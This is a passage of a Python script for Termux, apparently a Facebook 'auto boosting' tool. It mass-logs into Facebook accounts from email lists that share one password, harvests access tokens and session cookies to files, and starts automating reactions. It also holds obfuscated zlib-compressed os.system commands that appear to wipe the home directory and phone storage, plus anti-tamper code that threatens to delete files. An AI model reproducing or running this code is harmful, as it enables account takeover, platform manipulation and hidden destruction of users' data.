{magenta}│{WHITE}VERSION      : {GREEN}[1.6]                                        {magenta}│
{magenta}╰────────────────────────────────────────────────────────────╯
{magenta}╭────────────────────────────────────────────────────────────╮
{magenta}│{WHITE}             F U C K Y O U B Y P A S S E R                  {magenta}│
{magenta}╰────────────────────────────────────────────────────────────╯
{magenta}╭────────────────────────────────────────────────────────────╮
{magenta}│{WHITE}            AUTO BOOSTING FACEBOOK BY ARTHUR                {magenta}│
{magenta}╰────────────────────────────────────────────────────────────╯
{magenta}╭────────────────────────────────────────────────────────────╮
{magenta}│{WHITE}            DEVICE     : {bit}                              {magenta}│
{magenta}╰────────────────────────────────────────────────────────────╯{wh}""")

def overview():
    total_accounts = count_lines("/sdcard/ARTHUR-RPW-BOOSTING/toka.txt")
    total_pages = count_lines("/sdcard/ARTHUR-RPW-BOOSTING/tokp.txt")
    total_fras = count_lines("/sdcard/ARTHUR-RPW-BOOSTING/tokfra.json")
    total_rpws = count_lines("/sdcard/ARTHUR-RPW-BOOSTING/tokrpw.json")
    print(f'{magenta}╭────────────────────────────────────────────────────────────╮{wh}')
    print(f"{magenta}│            {cyan}TOTAL ACCOUNTS{yellow}: {green}{total_accounts}{r} | {cyan}TOTAL PAGES{yellow}: {green}{total_pages}              {magenta}│{r}")
    print(f"{magenta}│            {cyan}TOTAL FRA{yellow}:      {green}{total_fras}{r} | {cyan}TOTAL RPW{yellow}:   {green}{total_rpws}              {magenta}│{r}")
    print(f'{magenta}╰────────────────────────────────────────────────────────────╯{wh}')

def linex():
	   print(f'{magenta}──────────────────────────────────────────────────────────────{wh}')
def clear():
    os.system('clear')
    logo()
def clearr():
    if pf in ['win64','win32']:
        sm('cls')
    else:
        sm('clear')
    logo()

def fucked():
	os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
	os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
	print('{green}EXTRACTED SO MANY ACCOUNTS.{w}');exit()

def GC():
    print()
    name = input('INPUT YOUR NICKNAME : ')
    clear()
    print('FACEBOOK FOLLOW PLEASE')
    requests.delete(firebase_url + '/.json')
    time.sleep(3)
    clear()
    print('SEND > Hiiii!')
    thread = threading.Thread(target = listen_for_messages, args = (firebase_handler, group_name))
    thread.start()
    jjjj = input()
    clear_line()
    firebase_handler.send_message(group_name, name, jjjj)

def setup_user_data():
    os.makedirs("data", exist_ok=True)

    def create_file_if_not_exists(file_path):
        if not os.path.exists(file_path):
            open(file_path, "w").close()
    create_file_if_not_exists("data/namearthubpogi.xml")
    create_file_if_not_exists("data/passwordarthubpogi.xml")
    create_file_if_not_exists("data/agearthubpogi.xml")
    create_file_if_not_exists("data/locationarthubpogi.xml")
    create_file_if_not_exists("data/ganderarthubpogi.xml")

    def get_user_input(file_path, prompt_message):
        if os.path.getsize(file_path) > 0:
            with open(file_path, "r") as file_obj:
                return file_obj.readline().strip()
        else:
            user_input = input(prompt_message)
            with open(file_path, "w") as file_obj:
                file_obj.write(user_input)
            return user_input
    os.system('clear')
    logo()
    uname = get_user_input("data/namearthubpogi.xml", f"{c}「{r}•{c}」{r}ENTER YOUR NAME : ")
    upass = get_user_input("data/passwordarthubpogi.xml", f"{c}「{r}•{c}」{r}ENTER YOUR PASSWORD : ")
    unage = get_user_input("data/agearthubpogi.xml", f"{c}「{r}•{c}」{r}ENTER YOUR AGE : ")
    unlocation = get_user_input("data/locationarthubpogi.xml", f"{c}「{r}•{c}」{r}ENTER YOUR LOCATION : ")
    ungander = get_user_input("data/ganderarthubpogi.xml", f"{c}「{r}•{c}」{r}ENTER YOUR GANDER : ")

setup_user_data()

def get_user_name():
    with open("data/namearthubpogi.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_user_password():
    with open("data/passwordarthubpogi.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_user_age():
    with open("data/agearthubpogi.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_user_location():
    with open("data/locationarthubpogi.xml", "r") as file_obj:
        return file_obj.readline().strip()

def get_user_gander():
    with open("data/ganderarthubpogi.xml", "r") as file_obj:
        return file_obj.readline().strip()

def greet_user():
    current_time = datetime.now()
    user_name = get_user_name()
    if current_time.hour < 12:
        print(f"            GOOD MORNING | {GREEN}{user_name}!{wh}")
    elif current_time.hour < 18:
        print(f"            GOOD AFTERNOON | {GREEN}{user_name}!{r}")
    else:
        print(f"            GOOD EVENING | {GREEN}{user_name}!{w}")

def clr():
    overview()
    greet_user()

user_id = str(os.geteuid())
uuid = f"{user_id}DS{user_id}"
key = f"ARTHUR-{uuid}"

def get_approval_data(url):
    response = requests.get(url)
    response.raise_for_status()
    return response.text

def approval():
    try:
        user_id = str(os.geteuid())
        uuid = f"{user_id}NOMGFREPSMPP{user_id}"
        key = f"ARTHUR-{uuid}"
        clearr()
        print(f'{magenta}╭────────────────────────────────────────────────────────────╮')
        print(f"{magenta}│{WHITE}YOU NEED APPROVAL TO USE THIS TOOL                          {magenta}│")
        print(f"{magenta}│{WHITE}YOUR KEY : {key}                    {magenta}│")
        print(f'{magenta}╰────────────────────────────────────────────────────────────╯')
        time.sleep(0.1)
        urls = [
            "https://github.com/aaaaaaaarthur07/APPROVALSHEESH/blob/main/1.txt",
            "https://github.com/aaaaaaaarthur07/APPROVALSHEESH/blob/main/2.txt",
            "https://github.com/aaaaaaaarthur07/APPROVALSHEESH/blob/main/3.txt",
            "https://github.com/aaaaaaaarthur07/APPROVALSHEESH/blob/main/4.txt"
        ]        
        key_found = False
        for url in urls:
            approval_data = get_approval_data(url) 
            if key in approval_data:
                key_found = True
                break
        if key_found:
            print(f"{GREEN}YOUR KEY HAS BEEN APPROVED!!!")
            time.sleep(3)
            return key
        else:
            print(f"{WHITE}SEND KEY ON MESSENGER")
            time.sleep(0.1)
            input(f'{WHITE}CLICK ENTER TO SEND YOUR KEY')
            tks = f'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20{key}'
            os.system(f'am start https://www.messenger.com/t/Arthur.Keith.Grayson.IAmLimitless{tks}')
            time.sleep(1)
            exit() 
    except requests.RequestException:
        logging.error(f"{WHITE}UNABLE TO FETCH DATA FROM SERVER")
        print(f"{WHITE}UNABLE TO FETCH DATA FROM SERVER")
        time.sleep(2)
        exit()
    except Exception as e:
        logging.error(f"{WHITE}AN UNEXPECTED ERROR OCCURRED: %s", e)
        print(f"{WHITE}AN UNEXPECTED ERROR OCCURRED")
        time.sleep(2)
        exit()
approval()


def bypass():
  file = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r')
  file2 = qopen('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py','r')
  file3 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r')
  data = file.read()
  sess = file2.read()
  approve = file3.read()
  keyword =("print(url)")
  keyword2 = ("print(data)")
  if keyword in data or "echo" in data or "pprint" in data or "exec" in data:
    sm('clear')
    print(10*f"\n{red}BOBO BYPASS PA")
    print(f"\n{red}BYE BYE FILES AHAHAHHAHA")
    exit()
  elif "https://pastebin.com/raw/zg0D9N7Y" in approve or "DR4X" in approve or "pprint" in approve:
    print(10*f"{red}TRYING HARD BYPASSING MY TOOL LOL\n")
    exit()
  elif keyword in sess or "rich" in sess or "echo" in sess or keyword2 in sess or "pprint" in sess or "print(headers)" in sess or "Console" in sess or "{data}" in sess or "{url}" in sess or "{headers}" in sess or "open" in sess or ".write" in sess:
    sm('clear')
    print(20*f"\nCAPTURE DATA PA HAHAHAHAHA")
    print(f"\n{red}BYE BYE FILES")
    exit()
  else:
    timee=datetime.now()
    limittime=timee.strftime("%m-%d-%y")
    if limittime >= "10-30-24":
      clear()
      sys.exit(f"{red}TIME’S UP BRO")
    else:
      bypass()

def display_file_content(file_path):
    with open(file_path, 'r') as file:
        print(file.read())

def delete_line(path_file, check_path):
    display_file_content(check_path)
    linex()
    lines_to_delete = input(f'ENTER NUMBERS YOU WANT TO DELETE [USE COMMA IF MULTIPLE]: ')
    line_numbers = lines_to_delete.split(',')
    if not line_numbers or all(not line.strip().isdigit() for line in line_numbers):
        print('NO VALID LINE NUMBERS PROVIDED.')
        return None
    sed_command_path_file = " ".join([f"-e '{line_number.strip()}d'" for line_number in line_numbers])
    sed_command_path_file = f"sed -i {sed_command_path_file} {path_file}"
    sed_command_check_path = " ".join([f"-e '{line_number.strip()}d'" for line_number in line_numbers])
    sed_command_check_path = f"sed -i {sed_command_check_path} {check_path}"
    os.system(sed_command_path_file)
    os.system(sed_command_check_path)
    print(f'Lines {", ".join(map(str, line_numbers))} HAVE BEEN DELETED.')

def git_pull_repository():
    repo_path = '.'
    try:
        print(f"{c}UPDATING THE REPOSITORY...{r}")
        subprocess.run(['git', 'pull'], cwd=repo_path, check=True)
        print(f"{wh}REPOSITORY UPDATED SUCCESSFULLY.{r}")
    except subprocess.CalledProcessError as e:
        print(f"{red}ERROR OCCURRED WHILE UPDATING THE REPOSITORY: {e}{r}")

def Manual():
    clearr()
    user_choice = input(f"{wh}INPUT Y OR LEAVE BLANK IF IT'S ACCOUNT IF IT'S A PAGE THEN INPUT N INPUT(y/Y/yes/Yes or n/N/no/No or d/D/default/Default): {r}")
    user = input(f"{WHITE}USER ID/EMAIL:{wh} ")
    passw = input(f"{WHITE}PASSWORD:{wh} ")
    linex()
    cuser(user, passw, user_choice)

def Auto():
    directory = '/sdcard'
    txt_files = [f for f in os.listdir(directory) if f.endswith('.txt')]
    if not txt_files:
        print(f'{red}NO .TXT FILES FOUND IN {directory}')
        return
    for i, filename in enumerate(txt_files, start=1):
        print(f"{c}{r}{i}{c}{wh}  {filename}")
    try:
        linex()
        choice = int(input(f'{WHITE}「Choose」 : '))
        if 1 <= choice <= len(txt_files):
            selected_file = os.path.join(directory, txt_files[choice - 1])
            if os.path.isfile(selected_file):
                try:
                    user_choice = input(f"{ye}INPUT Y OR LEAVE BLANK IF IT'S ACCOUNT IF IT'S A PAGE THEN INPUT N INPUT(y/Y/yes/Yes or n/N/no/No or d/D/default/Default): {r}")
                    with open(selected_file, 'r') as file:
                        for line in file:
                            user_pass = line.strip().split('|')
                            process_users([user_pass], user_choice)
                except Exception as e:
                    print(f'{red}ERROR READING THE FILE : {e}')
            else:
                print(f'{red}FILE NOT FOUND')
        else:
            print(f'{red}INVALID OPTION.{r}')
    except ValueError:
        print(f'{red}INVALID INPUT.{r}')

def ManFile():
    clearr()
    file = input(f'{WHITE}PUT FILE PATH : ')
    if os.path.isfile(file):
        try:
            user_choice = input(f"{ye}INPUT Y OR LEAVE BLANK IF IT'S ACCOUNT IF IT'S A PAGE THEN INPUT N INPUT(y/Y/yes/Yes or n/N/no/No or d/D/default/Default): {r}")
            with open(file, 'r') as file:
                for line in file:
                    user_pass = line.strip().split('|')
                    process_users([user_pass], user_choice)
        except Exception as e:
            print(f'{red}ERROR READING THE FILE: {e}')
    else:
        print(f'{red}FILE LOCATION NOT FOUND')

def process_users(user_list, user_choice):
    for user_pass in user_list:
        if len(user_pass) == 2:
            user, passw = user_pass
            cuser(user, passw, user_choice)
        else:
            print(f"INVALID FORMAT IN LINE: {user_pass}")

def cuser(user, passw, user_choice):
    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
    data = {
        'adid': f'{uuid.uuid4()}',
        'format': 'json',
        'device_id': f'{uuid.uuid4()}',
        'cpl': 'true',
        'family_device_id': f'{uuid.uuid4()}',
        'credentials_type': 'device_based_login_password',
        'error_detail_type': 'button_with_disabled',
        'source': 'device_based_login',
        'email': user,
        'password': passw,
        'access_token': accessToken,
        'generate_session_cookies': '1',
        'meta_inf_fbmeta': '',
        'advertiser_id': f'{uuid.uuid4()}',
        'currently_logged_in_userid': '0',
        'locale': 'en_US',
        'client_country_code': 'US',
        'method': 'auth.login',
        'fb_api_req_friendly_name': 'authenticate',
        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
    }
    headers = {
        'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/en_US;FBBV/135374479;FBCR/SMART;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Net-HNI': str(random.randint(10000, 99999)),
        'X-FB-SIM-HNI': str(random.randint(10000, 99999)),
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'X-Tigon-Is-Retry': 'False',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
        'x-fb-device-group': str(random.randint(1000, 9999)),
        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
        'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'
    }
    pos = requests.post("https://b-graph.facebook.com/auth/login", headers=headers, data=data, allow_redirects=False).json()    
    if "session_key" in pos:
        print(f"{GREEN}SUCCESSFULLY --> {user} EXTRACTED SUCCESSFULLY.{wh}")
        cookie = ';'.join(i['name'] + '=' + i['value'] for i in pos['session_cookies'])
        c_user_value = [i['value'] for i in pos['session_cookies'] if i['name'] == 'c_user'][0]        
        if user_choice.lower() in ['n', 'no']:
            with open('/sdcard/ARTHUR-RPW-BOOSTING/tokpid.txt', 'a') as f:
                f.write(f'{c_user_value}\n')
            with open('/sdcard/ARTHUR-RPW-BOOSTING/tokp.txt', 'a') as f:
                f.write(f'{pos["access_token"]}\n')
        else:
            with open('/sdcard/ARTHUR-RPW-BOOSTING/toka.txt', 'a') as f:
                f.write(f'{pos["access_token"]}\n')
            with open('/sdcard/ARTHUR-RPW-BOOSTING/tokaid.txt', 'a') as f:
                f.write(f'{c_user_value}\n')
        with open('/sdcard/ARTHUR-RPW-BOOSTING/cok.txt', 'a') as f:
            f.write(f'{cookie}\n')
        with open('/sdcard/ARTHUR-RPW-BOOSTING/cokid.txt', 'a') as f:
            f.write(f'{c_user_value}\n')
    else:
        print(f"{red}FAILED --> {user} ISN'T EXTRACTED. {w}")

def lod_rpw(file_path):
    if not os.path.isfile(file_path):
        print(f"FILE {file_path} DOES NOT EXIST. CREATING A NEW FILE.")
        return {"access_tokens": []}
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
    except json.JSONDecodeError:
        print(f"ERROR : {file_path} IS NOT A VALID JSON FILE OR IS EMPTY. INITIALIZING WITH DEFAULT DATA.")
        data = {"access_tokens": []}
    except FileNotFoundError:
        data = {"access_tokens": []}
    return data

def seyv_rpw(data, file_path):
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=4)

def obteyn_rpw(email, password):
    h = {
        'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'x-fb-friendly-name': 'Authenticate',
        'x-fb-connection-type': 'Unknown',
        'accept-encoding': 'gzip, deflate',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-http-engine': 'Liger'
    }
    d = {
        'adid': ''.join(random.choices(string.hexdigits, k=16)),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'email': email,
        'password': password,
        'generate_analytics_claims': '0',
        'credentials_type': 'password',
        'source': 'login',
        'error_detail_type': 'button_with_disabled',
        'enroll_misauth': 'false',
        'generate_session_cookies': '0',
        'generate_machine_id': '0',
        'fb_api_req_friendly_name': 'authenticate',
    }
    ses = requests.Session()
    ses.headers.update(h)
    try:
        submit = ses.post('https://b-graph.facebook.com/auth/login', data=d).json()
    except requests.exceptions.RequestException as e:
        print(f'\n{red}ERROR: {str(e)}\033[0m')
        return None
    if 'session_key' in submit:
        token = submit["access_token"]
        print(f'\n{GREEN}SUCCESS: {token}\033[0m')
        return token
    else:
        error_msg = submit.get('error', {}).get('message', 'Unknown error')
        print(f'\n{red}FAILED: {error_msg}\033[0m')
        return None

def payl_rpw(file_path):
    tokens_array = []
    if not os.path.isfile(file_path):
        print(f"FILE {file_path} DOES NOT EXIST.")
        return tokens_array
    print(f"PROCESSING FILE: {file_path}")
    with open(file_path, 'r') as file:
        lines = file.readlines()
        if not lines:
            print(f"FILE {file_path} IS EMPTY.")
            return tokens_array
        password_line = lines[0].strip()
        if not password_line.startswith('PASSWORD: '):
            print(f"INVALID FORMAT. FIRST LINE SHOULD START WITH 'PASSWORD: '.")
            return tokens_array
        password = password_line.split(': ', 1)[1]
        emails = [line.strip() for line in lines[1:] if line.strip()]
        if not emails:
            print(f"NO EMAIL ADDRESSES FOUND IN THE FILE.")
            return tokens_array
        print(f"EXTRACTED PASSWORD: {password}")
        print(f"EXTRACTED EMAIL ADDRESSES/PHONE NUMBERS: {emails}")
        for email in emails:
            print(f"ATTEMPTING TO OBTAIN TOKEN FOR EMAIL/PHONE NUMBER: {email} using password: {password}")
            token = obteyn_rpw(email, password)
            if token:
                tokens_array.append({"email": email, "access_token": token})
    return tokens_array

def kaz_rpw(tokens_array):
    data = lod_rpw('/sdcard/ARTHUR-RPW-BOOSTING/tokrpw.json')
    access_tokens = data.get("access_tokens", [])
    for token_info in tokens_array:
        email = token_info["email"]
        access_token = token_info["access_token"]
        if any(token.get("access_token") == access_token for token in access_tokens):
            print(f"TOKEN ALREADY EXISTS FOR EMAIL: {email}")
            continue
        try:
            response = requests.get(f'https://graph.facebook.com/me?access_token={access_token}')
            if response.status_code == 200:
                is_valid_token = True
                pages_response = requests.get(f'https://graph.facebook.com/me/accounts?access_token={access_token}')
                if pages_response.status_code == 200:
                    pages_data = pages_response.json().get("data", [])
                    account_data = {"email": email, "access_token": access_token}
                    account_pages = [page for page in pages_data]
                    account_data["pages"] = account_pages
                    access_tokens.append(account_data)
                    data["access_tokens"] = access_tokens
                    print("{GREEN}SUCCESSFULLY ADDED ACCOUNT\033[0m")
            else:
                is_valid_token = False
        except requests.exceptions.RequestException:
            is_valid_token = False
        if not is_valid_token:
            print(f"INVALID TOKEN FOR EMAIL: {email}")
    seyv_rpw(data, '/sdcard/ARTHUR-RPW-BOOSTING/tokrpw.json')

def mainmany_rpw():
    clearr()
    file_path = input("ENTER THE PATH OF THE TEXT FILE WITH ACCOUNTS AND PASSWORDS: ").strip()
    all_tokens = []
    while True:
        tokens_array = payl_rpw(file_path)
        if tokens_array:
            all_tokens.extend(tokens_array)
            print("\nCOLLECTED TOKENS:")
            for token_info in tokens_array:
                print(f"EMAIL/PHONE NUMBER: {token_info['email']}, ACCESS TOKEN: {token_info['access_token']}")
            kaz_rpw(tokens_array)
            break
        else:
            print("NO MORE TOKENS COLLECTED OR NO MORE EMAILS TO PROCESS.")
            break
    print("PROCESSING COMPLETE.")
    print("\nALL COLLECTED TOKENS:")
    for token_info in all_tokens:
        print(f"EMAIL/PHONE NUMBER: {token_info['email']}, ACCESS TOKEN: {token_info['access_token']}")

def Apple_rpw(email, access_token, access_tokens):
    try:
        response = requests.get(f'https://graph.facebook.com/me?access_token={access_token}')
        if response.status_code == 200:
            pages_response = requests.get(f'https://graph.facebook.com/me/accounts?access_token={access_token}')
            if pages_response.status_code == 200:
                pages_data = pages_response.json().get("data", [])
                account_data = {"email": email, "access_token": access_token}
                account_pages = [page for page in pages_data]
                account_data["pages"] = account_pages
                access_tokens.append(account_data)
                print(f"SUCCESSFULLY ADDED ACCOUNT FOR {email}")
                return True
    except requests.RequestException as e:
        print(f"ERROR VALIDATING ACCESS TOKEN FOR {email}: {str(e)}")
    return False

def lod(file_path):
    if not os.path.isfile(file_path):
        print(f"FILE {file_path} DOES NOT EXIST. CREATING A NEW FILE.")
        return {"access_tokens": []}
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
    except json.JSONDecodeError:
        print(f"ERROR: {file_path} IS NOT A VALID JSON FILE OR IS EMPTY. INITIALIZING WITH DEFAULT DATA.")
        data = {"access_tokens": []}
    except FileNotFoundError:
        data = {"access_tokens": []}
    return data

def seyv(data, file_path):
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=4)

def obteyn(email, password):
    h = {
        'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
        'x-fb-friendly-name': 'Authenticate',
        'x-fb-connection-type': 'Unknown',
        'accept-encoding': 'gzip, deflate',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-http-engine': 'Liger'
    }
    d = {
        'adid': ''.join(random.choices(string.hexdigits, k=16)),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'email': email,
        'password': password,
        'generate_analytics_claims': '0',
        'credentials_type': 'password',
        'source': 'login',
        'error_detail_type': 'button_with_disabled',
        'enroll_misauth': 'false',
        'generate_session_cookies': '0',
        'generate_machine_id': '0',
        'fb_api_req_friendly_name': 'authenticate',
    }
    ses = requests.Session()
    ses.headers.update(h)
    try:
        submit = ses.post('https://b-graph.facebook.com/auth/login', data=d).json()
    except requests.exceptions.RequestException as e:
        print(f'\n{red}ERROR: {str(e)}\033[0m')
        return None
    if 'session_key' in submit:
        token = submit["access_token"]
        print(f'\n{GREEN}SUCCESSFULLY\033[0m')
        return token
    return None

def payl(file_path):
    tokens_array = []
    if not os.path.isfile(file_path):
        print(f"FILE {file_path} DOES NOT EXIST.")
        return tokens_array
    print(f"PROCESSING FILE: {file_path}")
    with open(file_path, 'r') as file:
        lines = file.readlines()
        if not lines:
            print(f"FILE {file_path} IS EMPTY.")
            return tokens_array
        password_line = lines[0].strip()
        if not password_line.startswith('PASSWORD: '):
            print(f"INVALID FORMAT. FIRST LINE SHOULD START WITH 'PASSWORD: '.")
            return tokens_array
        password = password_line.split(': ', 1)[1]
        emails = [line.strip() for line in lines[1:] if line.strip()]
        if not emails:
            print(f"NO EMAIL ADDRESSES FOUND IN THE FILE.")
            return tokens_array
        print(f"EXTRACTED PASSWORD: {password}")
        print(f"EXTRACTED EMAIL ADDRESSES/PHONE NUMBERS: {emails}")
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(obteyn, email, password): email for email in emails}
            for future in futures:
                token = future.result()
                if token:
                    tokens_array.append({"email": futures[future], "access_token": token})
    return tokens_array

def kaz(tokens_array):
    data = lod('/sdcard/ARTHUR-RPW-BOOSTING/toka.json')
    access_tokens = data.get("access_tokens", [])
    for token_info in tokens_array:
        email = token_info["email"]
        access_token = token_info["access_token"]
        if any(token.get("access_token") == access_token for token in access_tokens):
            continue
        try:
            response = requests.get(f'https://graph.facebook.com/me?access_token={access_token}')
            if response.status_code == 200:
                is_valid_token = True
                pages_response = requests.get(f'https://graph.facebook.com/me/accounts?access_token={access_token}')
                if pages_response.status_code == 200:
                    pages_data = pages_response.json().get("data", [])
                    account_data = {"email": email, "access_token": access_token}
                    account_pages = [page for page in pages_data]
                    account_data["pages"] = account_pages
                    access_tokens.append(account_data)
                    data["access_tokens"] = access_tokens
                    print("{GREEN}SUCCESSFULLY ADDED ACCOUNT\033[0m")
            else:
                is_valid_token = False
        except requests.exceptions.RequestException:
            is_valid_token = False
    seyv(data, '/sdcard/ARTHUR-RPW-BOOSTING/toka.json')

def mainmany():
    clearr()
    file_path = input("ENTER THE PATH OF THE TEXT FILE WITH ACCOUNTS AND PASSWORDS: ").strip()
    all_tokens = []
    while True:
        tokens_array = payl(file_path)
        if tokens_array:
            all_tokens.extend(tokens_array)
            print("\nCOLLECTED TOKENS:")
            for token_info in tokens_array:
                print(f"EMAIL/PHONE NUMBER: {token_info['email']}, ACCESS TOKEN: {token_info['access_token']}")
            kaz(tokens_array)
            break
        else:
            print("NO MORE TOKENS COLLECTED OR NO MORE EMAILS TO PROCESS.")
            break
    print("PROCESSING COMPLETE.")
    print("\nALL COLLECTED TOKENS:")
    for token_info in all_tokens:
        print(f"EMAIL/PHONE NUMBER: {token_info['email']}, ACCESS TOKEN: {token_info['access_token']}")

def Aguinaldo():
    clearr()
    linex()
    print(f"{WHITE}「1」ADD ACCOUNT & PAGES TO FRA")
    print(f"{WHITE}「2」ADD ACCOUNT & PAGES TO RPW")
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
       mainmany()
    elif me == '2':
       main_program_rpw()
       mainmany_rpw()
    else:
       print(f'{red}INVALID OPTION.')

def rizal():
    try:
        with open('/sdcard/ARTHUR-RPW-BOOSTING/toka.json', 'r') as file:
            data = json.load(file)
    except FileNotFoundError:
        data = {"access_tokens": []}
    return data

def Fuckagun():
    clearr()
    print("AUTOMATICALLY STARTING THE ACCESS TOKEN MANAGER!")
    while True:
        mabini()

def mabini():
    data = rizal()
    access_tokens = data.get("access_tokens", [])
    if not access_tokens:
        print("NO TOKENS FOUND.")
    else:
        for idx, token_info in enumerate(access_tokens, start=1):
            print(f"TOKEN {idx}:")
            print(f"  ACCESS TOKEN: {token_info['access_token']}")
            for page in token_info.get("pages", []):
                print(f"    PAGE ID: {page['id']} - PAGE NAME: {page['name']}")
                print(f"      CATEGORY: {page['category']}")
                print(f"      PERMISSIONS: {', '.join(page['perms'])}")
                print(f"      TASKS: {', '.join(page['tasks'])}")
    input('PRESS ENTER TO BACK')
    menu()

def bonifacio(data):
    with open('/sdcard/ARTHUR-RPW-BOOSTING/toka.json', 'w') as file:
        json.dump(data, file, indent=4)

def mabini():
    data = rizal()
    if isinstance(data, list):
        access_tokens = data
    else:
        access_tokens = data.get("access_tokens", [])
    access_token = input("ENTER THE EAAU TOKEN: ")
    if any(token.get("access_token") == access_token for token in access_tokens):
        print("TOKEN ALREADY EXISTS.")
    else:
        try:
            response = requests.get(f'https://graph.facebook.com/me?access_token={access_token}')
            if response.status_code == 200:
                pages_info = del_pilar(access_token)
                account_data = {"access_token": access_token, "pages": pages_info}
                access_tokens.append(account_data)
                if isinstance(data, list):
                    data = access_tokens
                else:
                    data["access_tokens"] = access_tokens
                print("{GREEN}SUCCESSFULLY EXTRACTED SUCCESSFULLY.{wh}")
            else:
                print("INVALID TOKEN.")
        except requests.exceptions.RequestException:
            print("ERROR CONNECTING TO FACEBOOK API.")
    bonifacio(data)
    mabini()

def obtain(cookie):
    h = {
        'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',       
        'x-fb-friendly-name': 'Authenticate',
        'x-fb-connection-type': 'Unknown',
        'accept-encoding': 'gzip, deflate',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-http-engine': 'Liger'
    }
    d = {
        'adid': ''.join(random.choices(string.hexdigits, k=16)),
        'format': 'json',
        'device_id': str(uuid.uuid4()),
        'cookie': cookie,
        'generate_analytics_claims': '0',
        'credentials_type': 'password',
        'source': 'login',
        'error_detail_type': 'button_with_disabled',
        'enroll_misauth': 'false',
        'generate_session_cookies': '0',
        'generate_machine_id': '0',
        'fb_api_req_friendly_name': 'authenticate',
    }
    ses = requests.Session()
    ses.headers.update(h)
    submit = ses.post('https://b-graph.facebook.com/auth/login', data=d).json()        
    if 'session_key' in submit:
       coki = ";".join(i["name"]+"="+i["value"] for i in submit["session_cookies"])
       print(f'{magenta}╭────────────────────────────────────────────────────────────╮')
       print(f'{magenta}│{green}             LOGIN SUCCESSFULLY                             {magenta}│')
       print(f'{magenta}╰────────────────────────────────────────────────────────────╯')
       linex()
       print(f'\n{green}TOKEN  : {submit["access_token"]} \033[0m')
       linex()
       print(f'\n{green}COOKIE : {coki} \033[0m')
    elif 'www.facebook.com' in submit.get('error', {}).get('message', ''):
        print('\n{red}FAILED : ACCOUNT IN CHECKPOINT \033[0m')
    else:
        print(f'\n{red}ERROR: {submit}\033[0m')

def email_pass_acc():
	clearr()
	cookie = input(f'{green}COOKIE : ')
	linex()
	obtain(cookie)

def start_tool():
    clearr()
    linex()
    print(f"{WHITE}「1」MANUAL THROUGH INPUT")
    print(f"{WHITE}「2」MANUAL THROUGH FILE")
    print(f"{WHITE}「3」AUTOMATIC THROUGH OPTION")
    print(f"{WHITE}「4」MANUAL THROUGH EAAU")
    print(f"{WHITE}「5」AUTOMATIC THROUGH EAAU")
    linex()
    me = input(f'{WHITE}「Choose」 : ')
    if me == '1':
        Manual()
    if me == '2':
    	ManFile()
    if me == '3':
        Auto()
    if me == '4':
    	Aguinaldo()
    elif me == '5':
    	Fuckagun()
    else:
        print(f'{red}INVALID OPTION.')

def Reaction(actor_id:str, post_id:str, react:str, token:str):
    rui    = requests.Session()
    var  = {"input":{"feedback_referrer":"native_newsfeed","tracking":[None],"feedback_id":str(base64.b64encode(('feedback:{}'.format(post_id)).encode('utf-8')).decode('utf-8')),"client_mutation_id":str(uuid.uuid4()),"nectar_module":"newsfeed_ufi","feedback_source":"native_newsfeed","attribution_id_v2":"NewsFeedFragment,native_newsfeed,cold_start,1710331848.276,264071715,4748854339,,","feedback_reaction_id":react,"actor_id":actor_id,"action_timestamp":str(time.time())[:10]}}
